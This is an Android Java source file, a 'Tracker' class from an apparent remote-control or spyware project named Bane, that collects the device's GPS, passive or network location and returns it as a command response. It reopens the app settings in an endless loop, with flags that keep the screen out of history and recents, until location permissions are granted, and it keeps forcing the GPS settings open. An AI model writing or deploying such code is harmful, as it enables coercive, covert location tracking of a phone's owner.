package com.example.bane.bane.gps;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.Settings;
import android.widget.Toast;
import androidx.core.content.ContextCompat;
import com.bane.model.*;
import com.example.bane.MainActivity;
import com.example.bane.BaneService;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeUnit;

public class Tracker implements Callable<BaneObject> {

    private LocationManager locator = (LocationManager) BaneService.context.getSystemService(Context.LOCATION_SERVICE);

    private boolean checkGPS() {
        return locator.isProviderEnabled("gps");
    }

    private void askPermissions(){
        Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent.addCategory("android.intent.category.DEFAULT");
        String pkg = "package:" + BaneService.context.getPackageName();
        intent.setData(Uri.parse(pkg));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        BaneService.context.startActivity(intent);
        try {
            TimeUnit.SECONDS.sleep(5);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private BaneObject locate() {
        // default response
        String response = "Position Status Unreachable";
        // keep asking for GPS permissions
        while(!(ContextCompat.checkSelfPermission(BaneService.context, "android.permission.ACCESS_FINE_LOCATION") == 0 && ContextCompat.checkSelfPermission(BaneService.context, "android.permission.ACCESS_COARSE_LOCATION") == 0)){
            askPermissions();
        }
        // checking if gps is ok
        while(!checkGPS()) {
            MainActivity.activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast toast = Toast.makeText(BaneService.context, "Turn on GPS Service", Toast.LENGTH_LONG);
                    toast.show();
                    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    BaneService.context.startActivity(intent);
                }
            });
            try {
                TimeUnit.SECONDS.sleep(5);
            } catch (InterruptedException e) {
                return new BaneObject(BaneCode.ERROR,"Exception on gps turn on",new BaneValue[]{});
            }
        }
        String type = "GPS";
        // getting the location through GPS
        Location loc = locator.getLastKnownLocation("gps");
        // getting the position passively
        if (loc == null) {
            type = "Passive";
            loc = locator.getLastKnownLocation("passive");
            // getting the position from the network
            if(loc == null) {
                type = "Network";
                loc = locator.getLastKnownLocation("network");
            }
        }
        if(loc != null)
            response = "Latitude: " + loc.getLatitude() + " Longitude: " + loc.getLongitude() + " Altitude: " + loc.getAltitude()+ "type: "+type;
        if(response.contains("Unreachable"))
            return new BaneObject(BaneCode.ERROR,response,new BaneValue[]{});
        else
            return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{new BaneValue<String>("gps",response)});
    }

    @Override
    public BaneObject call() {
        return locate();
    }

}
